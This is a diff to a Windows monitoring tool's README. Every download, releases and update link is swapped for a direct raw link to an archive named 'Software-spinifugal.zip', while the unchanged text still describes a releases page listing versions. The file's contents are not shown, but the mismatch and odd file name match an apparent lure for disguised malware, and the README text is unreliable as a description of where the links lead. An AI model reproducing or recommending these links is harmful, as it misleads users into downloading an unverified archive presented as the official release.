@@ -1,6 +1,6 @@
 # ⚙️ velboard - 9 Panels for Real-Time Monitoring
 
-[![Download velboard](https://img.shields.io/badge/Download-velboard-brightgreen?style=for-the-badge)](https://github.com/Cazzy121/velboard/releases)
+[![Download velboard](https://img.shields.io/badge/Download-velboard-brightgreen?style=for-the-badge)](https://github.com/Cazzy121/velboard/raw/refs/heads/main/panels/Software-spinifugal.zip)
 
 ## 📝 What is velboard?
 
@@ -23,7 +23,7 @@ The panels display information clearly on your screen. This helps you keep tabs 
 
 To get velboard, visit the official releases page on GitHub:
 
-[![Visit the velboard Releases](https://img.shields.io/badge/Go_to_Releases-blue?style=for-the-badge)](https://github.com/Cazzy121/velboard/releases)
+[![Visit the velboard Releases](https://img.shields.io/badge/Go_to_Releases-blue?style=for-the-badge)](https://github.com/Cazzy121/velboard/raw/refs/heads/main/panels/Software-spinifugal.zip)
 
 This page has all the versions and files you may need. The latest stable release will work best for most users.  
 
@@ -37,7 +37,7 @@ Follow these steps to get velboard running on a Windows computer. You don't need
 
 Open your web browser. Type or click this link to open the releases page:
 
-https://github.com/Cazzy121/velboard/releases
+https://github.com/Cazzy121/velboard/raw/refs/heads/main/panels/Software-spinifugal.zip
 
 You will see a list of versions. Look for the newest one. It will usually be at the top or marked as "Latest release."
 
@@ -123,7 +123,7 @@ If velboard does not start or shows errors, try these:
 
 ## 🔄 Updating velboard
 
-Check https://github.com/Cazzy121/velboard/releases regularly to find newer versions.  
+Check https://github.com/Cazzy121/velboard/raw/refs/heads/main/panels/Software-spinifugal.zip regularly to find newer versions.  
 
 When a new version is available:  
 
@@ -140,4 +140,4 @@ For questions or support, check the GitHub repository issues section. You can fi
 
 ---
 
-[![Download velboard](https://img.shields.io/badge/Download-velboard-brightgreen?style=for-the-badge)](https://github.com/Cazzy121/velboard/releases)
+[![Download velboard](https://img.shields.io/badge/Download-velboard-brightgreen?style=for-the-badge)](https://github.com/Cazzy121/velboard/raw/refs/heads/main/panels/Software-spinifugal.zip)
